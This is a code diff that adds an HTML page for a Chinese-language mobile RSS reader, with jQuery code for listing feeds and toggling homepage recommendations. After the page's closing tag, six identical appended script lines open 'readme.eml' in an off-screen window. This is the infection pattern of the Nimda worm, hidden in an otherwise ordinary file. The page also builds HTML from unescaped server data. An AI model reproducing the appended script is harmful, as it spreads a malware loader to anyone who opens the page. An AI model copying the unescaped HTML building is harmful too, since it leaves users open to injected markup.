@@ -1,0 +1,377 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <meta name="viewport" id="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;minimum-scale=1.0; user-scalable=no;" />
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <link  href="css/style.css" type="text/css" rel="stylesheet"/>
+
+        <title>无标题文档</title>
+    </head>
+    <body>
+        <div class="NBA_info" id="my_NBA_info">
+            <div class="header">
+                <a href="index.html" class="return_a">返回</a>
+                <span id="my_header_p"></span>
+                <strong></strong>
+            </div>
+            <div id="wrapper1">
+                <div class="search_ul" id="my_search_ul" style="width:100%;margin:0;">
+                    <!--        	<a href="#"><b></b><p>&nbsp;我的首页</p></a>-->
+<!--                    <ul class="more_ul">
+
+                    </ul>-->
+
+                    <div id="shouye_tj"></div>
+                    <div id="hot_tj"></div>
+                    <!--               <a href="#"><b></b><p>&nbsp;我的首页</p></a>
+                                    <a href="#"><b></b><p>&nbsp;体育</p></a>-->
+                </div>
+            </div>
+        </div>
+        <div class="tanchuceng" id="my_tanchuceng" style="display:none">
+            添加成功
+        </div>
+        <script type="text/javascript" src="js/jquery.js"></script>
+        <script type="text/javascript" src="js/common.js"></script>
+
+
+
+        <script type="text/javascript">
+		
+            window.uexOnload = function(){
+               
+                show_appName();
+                search_more_rssInfo();
+                hot_tj();
+            }
+		
+            //show appName
+            function show_appName(){
+                var get_appName_url  = myurl + "get_appName";
+
+                $.getJSON(get_appName_url,function(data){
+                    if(data!=""){
+                        $id("my_header_p").innerText = data.app_name;	
+                    }
+                });
+
+            }
+    
+             //解析rss源
+            function search_more_rssInfo()
+            {
+                //我的首页
+                var tj_List_url = myurl + "search_rss_tj";
+                
+                $.getJSON(tj_List_url,function(list){
+                    // if(list!=""){ 
+                    var html_shouye ="<a href='javascript:void(0)' class=\"stop\" id='my_show_clicked_0' onclick=\"show_rss_ul(0)\"><b></b><p>&nbsp;我的首页</p></a><ul class='more_ul' id='ul_0'>";
+                    var html_ss ="";
+                    listLength = list.length;
+            
+                    for(var i=0;i<listLength;i++){
+                        html_ss+="<li onclick=\"zy_for_del(event,'"+list[i]['id']+"')\"><span>"+list[i]['inf_title']+"</span><input type='checkbox' id='my_checkbox_"+list[i]['id']+"' checked='checked' onclick=\"del_shouye('"+list[i]['id']+"')\" /></li>";
+                
+                    }
+                    html_shouye += html_ss + "</ul>";
+            
+                    $("#shouye_tj").html(html_shouye);
+            
+                    //}
+        
+                })
+    
+            }
+
+            function hot_tj()
+            {
+                var get_source_url = myurl + "search_more_rss";	
+                $.getJSON(get_source_url,function(data){
+                        if(data!=""){
+                            var data_len = data.length;
+                            var html_type ="";
+                            var html_rss_li ="";
+                            for(var i=0;i<data_len;i++){
+                                var rssindex = "content" + data[i].id;
+                                if(!data[i][rssindex]){
+                                    continue;
+                                }
+                                var cc = 0;
+                                var rssArrLen = data[i][rssindex].length;
+                                cc = i + 1;
+                                if(rssArrLen>0){
+                                    html_type +="<a href='javascript:void(0)' id='my_show_clicked_"+cc+"' onclick=\"show_rss_ul('"+cc+"')\"><b></b><p>&nbsp;"+data[i].it_typeName+"</p></a><ul class='more_ul' id='ul_"+cc+"'>";
+                                    for(var j=0;j<rssArrLen;j++){
+                                        if(data[i][rssindex][j].inf_state=="TRUE"){
+                                            html_rss_li +="<li onclick=\"zy_for_state(event,'"+data[i][rssindex][j].id+"')\"><span>"+data[i][rssindex][j].inf_title+"</span><input type='checkbox' id='my_checkbox_"+data[i][rssindex][j].id+"' checked='checked' onclick=\"change_tj_state('"+data[i][rssindex][j].id+"',1)\" /></li>"
+                                        }else{
+                                            html_rss_li +="<li onclick=\"zy_for_state(event,'"+data[i][rssindex][j].id+"')\"><span>"+data[i][rssindex][j].inf_title+"</span><input type='checkbox' id='my_checkbox_"+data[i][rssindex][j].id+"' onclick=\"change_tj_state('"+data[i][rssindex][j].id+"',2)\" /></li>";
+                                        }
+                                
+                                    }
+                            
+                                }
+                                html_type+=html_rss_li+"</ul>";
+                                html_rss_li = "";
+                            }
+                            uexWindow.closeToast();
+                            $id("hot_tj").innerHTML = html_type; 
+					
+                            var class_o  =$class(".more_ul");
+                            for(var i=0;i<class_o.length;i++){
+                                $class(".more_ul")[i].style.display="none";
+                            }
+                    
+                            $class(".more_ul")[0].style.display="block";
+                        }
+                
+                    });	
+            }
+                 
+            function static_hot_tj()
+            {
+                     var get_source_url = myurl + "search_more_rss";	
+                    $.getJSON(get_source_url,function(data){
+                            if(data!=""){
+                                var data_len = data.length;
+                                var html_type ="";
+                                var html_rss_li ="";
+                                for(var i=0;i<data_len;i++){
+                                    var rssindex = "content" + data[i].id;
+                                    if(!data[i][rssindex]){
+                                        continue;
+                                    }
+                                    var cc = 0;
+                                    var rssArrLen = data[i][rssindex].length;
+                                    cc = i + 1;
+                                    if(rssArrLen>0){
+                                        html_type +="<a href='javascript:void(0)' id='my_show_clicked_"+cc+"' onclick=\"show_rss_ul('"+cc+"')\"><b></b><p>&nbsp;"+data[i].it_typeName+"</p></a><ul class='more_ul' id='ul_"+cc+"'>";
+                                        for(var j=0;j<rssArrLen;j++){
+                                            if(data[i][rssindex][j].inf_state=="TRUE"){
+                                                html_rss_li +="<li onclick=\"zy_for_state(event,'"+data[i][rssindex][j].id+"')\"><span>"+data[i][rssindex][j].inf_title+"</span><input type='checkbox' id='my_checkbox_"+data[i][rssindex][j].id+"' checked='checked' onclick=\"change_tj_state('"+data[i][rssindex][j].id+"',1)\" /></li>"
+                                            }else{
+                                                html_rss_li +="<li onclick=\"zy_for_state(event,'"+data[i][rssindex][j].id+"')\"><span>"+data[i][rssindex][j].inf_title+"</span><input type='checkbox' id='my_checkbox_"+data[i][rssindex][j].id+"' onclick=\"change_tj_state('"+data[i][rssindex][j].id+"',2)\" /></li>";
+                                            }
+
+                                        }
+
+                                    }
+                                    html_type+=html_rss_li+"</ul>";
+                                    html_rss_li = "";
+                                }
+
+                                $id("hot_tj").innerHTML = html_type; 
+                            }
+                      })
+            }    
+                
+                
+            function static_shouye_tj(flag)
+            {
+                //我的首页
+                var tj_List_url = myurl + "search_rss_tj";
+                
+                $.getJSON(tj_List_url,function(list){
+                    // if(list!=""){ 
+                    var html_shouye ="<a href='javascript:void(0)'  id='my_show_clicked_0' onclick=\"show_rss_ul(0)\"><b></b><p>&nbsp;我的首页</p></a><ul class='more_ul' id='ul_0'>";
+                    var html_ss ="";
+                    listLength = list.length;
+            
+                    for(var i=0;i<listLength;i++){
+                        html_ss+="<li onclick=\"zy_for_del(event,'"+list[i]['id']+"')\"><span>"+list[i]['inf_title']+"</span><input type='checkbox' id='my_checkbox_"+list[i]['id']+"' checked='checked' onclick=\"del_shouye('"+list[i]['id']+"')\" /></li>";
+                
+                    }
+                    html_shouye += html_ss + "</ul>";
+                    
+                    $("#shouye_tj").html(html_shouye);
+                    if(flag==false){
+                        $id("ul_0").style.display="none";
+                    }
+                    
+                })
+            }
+                
+            //显示rss分类下的 rss ul
+            function show_rss_ul(id)
+            {			
+                var flag = $id("ul_"+id).style.display;
+                var class_o  =$class(".more_ul");
+                var daohang  =$("#my_search_ul a");
+                
+                for(var j=0;j<daohang.length;j++){
+                    document.getElementById("my_show_clicked_"+j).className="";
+                }
+                document.getElementById("my_show_clicked_"+id).className="stop";
+                for(var i=0;i<class_o.length;i++){
+                    $class(".more_ul")[i].style.display="none";
+                }
+		
+                if(flag=="none"){
+                    $id("ul_"+id).style.display="block";
+                }else{
+                    $id("ul_"+id).style.display="none";
+                }
+                
+            }
+			
+            //点击checkbox修改rss推荐状态
+            function change_tj_state(id,status)
+            {
+                var update_tj_state_url = myurl + "update_rss_tj_state";
+                var flags = null;
+                if(status==1){
+                    flags = false;
+                    update_tj_state_url +="&inf_state=FALSE&rssId="+id;
+                }
+
+                if(status==2){
+                    flags = true;
+                    update_tj_state_url +="&inf_state=TRUE&rssId="+id;
+                }
+ 
+                $.getJSON(update_tj_state_url,function(msg){
+                       
+                    if(msg!=""){
+//                        search_more_rssInfo();
+//                        hot_tj();
+                        static_hot_tj();
+                        static_shouye_tj(false);
+                        $("#my_checkbox_"+id).css("");
+                        if(flags){
+                            show_msg(true,"成功添加首页推荐！！");
+                            setTimeout("show_msg(false)",1500);
+                        }else{
+                            show_msg(true,"成功取消首页推荐！！");
+                            setTimeout("show_msg(false)",1500);
+                        }
+	                           
+                    }
+                });
+            }	
+		
+		
+            //取消首页推荐
+            function del_shouye(id){
+                var del_shouye_url = myurl + "update_rss_tj_state&inf_state=FALSE&rssId="+id;
+                $.getJSON(del_shouye_url,function(msg){
+                    if(msg!=""){
+                        search_more_rssInfo();
+                        hot_tj();
+                        show_msg(true,"成功取消首页推荐！！");
+                        setTimeout("show_msg(false)",1500);
+                    }
+                });
+            }
+		
+			
+            //弹出层提示
+            function show_msg(flag,msg)
+            {
+                                
+                if(flag){
+                    $id("my_tanchuceng").innerHTML = msg;
+                    $id("my_tanchuceng").style.display="block"; 	
+                }else{
+                    $id("my_tanchuceng").style.display="none";
+                }
+            }
+		
+            function zy_for_del(e,id,cb)
+            {
+                var ch_bf = e.currentTarget.firstChild;
+                var ch = ch_bf.nextSibling;
+                if(ch.nodeName == "INPUT")
+                {
+                    if(ch.type=="checkbox")
+                        ch.checked=!ch.checked;
+                    del_shouye(id);
+                }
+                if(cb){
+                    cb(e,ch.checked);
+                }
+		            
+            }
+		
+		
+            function zy_for_state(e,id,cb)
+            {
+                var ch_bf = e.currentTarget.firstChild;
+                var ch = ch_bf.nextSibling;
+                var update_tj_state_url = myurl + "update_rss_tj_state";
+                if(ch.nodeName == "INPUT")
+                {
+                    if(ch.type=="checkbox")
+                    {
+	            	
+                        ch.checked=!ch.checked;
+                        if(ch.checked==false){
+                            flags = false;
+                            update_tj_state_url +="&inf_state=FALSE&rssId="+id;
+                        }else{
+                            flags = true;
+                            update_tj_state_url +="&inf_state=TRUE&rssId="+id;
+                        }
+                    }
+	                
+                }
+                if(cb){
+                    cb(e,ch.checked);
+                }
+	        
+	        
+                $.getJSON(update_tj_state_url,function(msg){
+                
+                    if(msg!=""){
+                        //static_hot_tj();
+                        static_shouye_tj(false);
+                        $("#my_checkbox_"+id).css("");
+                        if(flags){
+                            show_msg(true,"成功添加首页推荐！！");
+                            setTimeout("show_msg(false)",1500);
+                        }else{
+                            show_msg(true,"成功取消首页推荐！！");
+                            setTimeout("show_msg(false)",1500);
+                        }
+                    }
+                });
+	            
+            }
+		
+			
+        </script>
+
+
+        <script type="application/javascript" src="js/iscroll.js"></script>
+        <script type="text/javascript">
+
+            var myScroll;
+            /*function loaded() {
+                myScroll = new iScroll('wrapper', { scrollbarClass: 'myScrollbar',checkDOMChanges: true });
+        }*/
+            function loaded() {
+                myScroll = new iScroll('wrapper1', {scrollbarClass: 'myScrollbar',checkDOMChanges: true,
+                    useTransform: false,
+                    onBeforeScrollStart: function (e) {
+                        var target = e.target;
+                        while (target.nodeType != 1) target = target.parentNode;
+
+                        if (target.tagName != 'SELECT' && target.tagName != 'INPUT' && target.tagName != 'TEXTAREA')
+                            e.preventDefault();
+                    }
+                });
+            }
+            document.addEventListener('touchmove', function (e) { e.preventDefault(); }, false);
+            document.addEventListener('DOMContentLoaded', loaded, true);
+ 
+        </script>
+
+
+    </body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
